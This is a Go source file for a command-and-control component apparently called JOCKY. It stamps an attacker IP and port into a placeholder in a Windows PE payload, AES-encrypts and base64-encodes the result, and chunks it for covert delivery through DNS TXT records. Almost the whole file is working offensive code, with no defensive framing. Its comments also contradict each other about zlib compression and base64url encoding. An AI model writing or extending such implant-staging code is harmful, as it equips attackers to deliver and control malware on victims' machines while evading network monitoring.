// Package c2 implements the JOCKY payload processing pipeline:
// IP/port patching → zlib compression → AES-256-CBC encryption →
// base64 encoding → DNS-safe chunking.
package c2

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"io"
)

// PatchIPInPayload finds the 64-byte placeholder "ATTACKER_IP_HERE\0..."
// in the binary, overwrites it with the supplied IP (null-padded to 64
// bytes), and writes the port as a little-endian USHORT immediately
// after.  Returns a copy — the original slice is not modified.
func PatchIPInPayload(payload []byte, ip string, port uint16) ([]byte, error) {
	// Build the exact 64-byte placeholder that the payload was compiled with.
	placeholder := make([]byte, 64)
	copy(placeholder, []byte("ATTACKER_IP_HERE"))

	idx := bytes.Index(payload, placeholder)
	if idx < 0 {
		return nil, fmt.Errorf("patch ip: placeholder 'ATTACKER_IP_HERE' not found in payload")
	}
	if idx+64+2 > len(payload) {
		return nil, fmt.Errorf("patch ip: payload too small to hold port field after placeholder")
	}

	result := make([]byte, len(payload))
	copy(result, payload)

	// Zero the 64-byte region then stamp the IP string.
	for i := 0; i < 64; i++ {
		result[idx+i] = 0
	}
	copy(result[idx:], []byte(ip))

	// Port as little-endian uint16 immediately after the 64-byte IP field.
	binary.LittleEndian.PutUint16(result[idx+64:], port)

	return result, nil
}

// ChunkPayload splits data into chunks of exactly chunkSize bytes,
// with the final chunk being smaller if necessary.  Returns base64url
// strings suitable for embedding in DNS TXT records.
func ChunkPayload(data []byte, chunkSize int) []string {
	if chunkSize <= 0 {
		chunkSize = 189
	}
	var chunks []string
	for len(data) > 0 {
		end := chunkSize
		if end > len(data) {
			end = len(data)
		}
		chunks = append(chunks, string(data[:end]))
		data = data[end:]
	}
	return chunks
}

// ProcessPayload runs the full pipeline on a raw PE binary:
//  1. Patch attacker IP + port into the payload
//  2. SHA-256 the original (for the manifest integrity field)
//  3. AES-256-CBC-encrypt (random IV prepended)
//  4. Base64-encode
//  5. Chunk into 189-byte slices
//
// Note: no zlib compression — the agent does not decompress.
// Returns (chunks, hex_sha256_of_original, error).
func ProcessPayload(rawPayload, aesKey []byte, attackerIP string, attackerPort uint16) ([]string, string, error) {
	// 1. Patch
	patched, err := PatchIPInPayload(rawPayload, attackerIP, attackerPort)
	if err != nil {
		return nil, "", fmt.Errorf("process payload: %w", err)
	}

	// 2. Hash original before any transformation
	sum := sha256.Sum256(rawPayload)
	hashHex := hex.EncodeToString(sum[:])

	// 3. Encrypt
	encrypted, err := aesCBCEncrypt(patched, aesKey)
	if err != nil {
		return nil, "", fmt.Errorf("process payload encrypt: %w", err)
	}

	// 4. Base64
	encoded := base64.StdEncoding.EncodeToString(encrypted)

	// 5. Chunk
	chunks := ChunkPayload([]byte(encoded), 189)

	return chunks, hashHex, nil
}

// aesCBCEncrypt encrypts data with AES-256-CBC.
// A random 16-byte IV is prepended to the ciphertext so the receiver
// can decrypt without an out-of-band IV exchange.
func aesCBCEncrypt(data, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, fmt.Errorf("aes new cipher: %w", err)
	}

	iv := make([]byte, aes.BlockSize)
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		return nil, fmt.Errorf("aes generate iv: %w", err)
	}

	padded := pkcs7Pad(data, aes.BlockSize)
	ciphertext := make([]byte, len(padded))
	cipher.NewCBCEncrypter(block, iv).CryptBlocks(ciphertext, padded)

	// IV || ciphertext
	return append(iv, ciphertext...), nil
}

// pkcs7Pad pads data to a multiple of blockSize using PKCS#7.
func pkcs7Pad(data []byte, blockSize int) []byte {
	padding := blockSize - (len(data) % blockSize)
	return append(data, bytes.Repeat([]byte{byte(padding)}, padding)...)
}
